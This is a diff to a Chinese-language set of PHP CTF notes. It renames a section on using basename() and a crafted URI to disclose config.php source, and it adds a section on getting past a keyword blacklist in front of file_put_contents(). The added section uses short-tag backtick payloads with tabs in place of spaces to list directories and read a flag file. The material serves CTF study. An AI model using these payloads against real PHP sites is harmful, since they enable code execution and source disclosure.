@@ -39,7 +39,7 @@ php内的"\"在做代码执行的时候，会识别特殊字符串，绕过黑�
 如\system
 
 ^
-## **$_SERVER['PHP_SELF']场景漏洞**
+## **basename()场景漏洞**
 源代码：
 ```
 if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
@@ -67,4 +67,20 @@ basename($var2)	=>	config.php
 接下来就显然了，通过构造URI让其包含`config.php`这个文件名再让`basename`函数截取出来，之后通过请求参数`source`就能显示`config.php`的源码，也就能见到`flag`了。
 ```
 /index.php/config.php/%ff?source
+```
+
+
+^
+## **file_put_contents()场景漏洞**
+对于
+```
+if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
+        die('hacker!!!');
+}
+file_put_contents("index.php", $input)
+```
+可以传入绕过
+```
+<?=`ls\t/*`?>
+<?=`cat\t/flllllll1112222222lag`?>
 ```
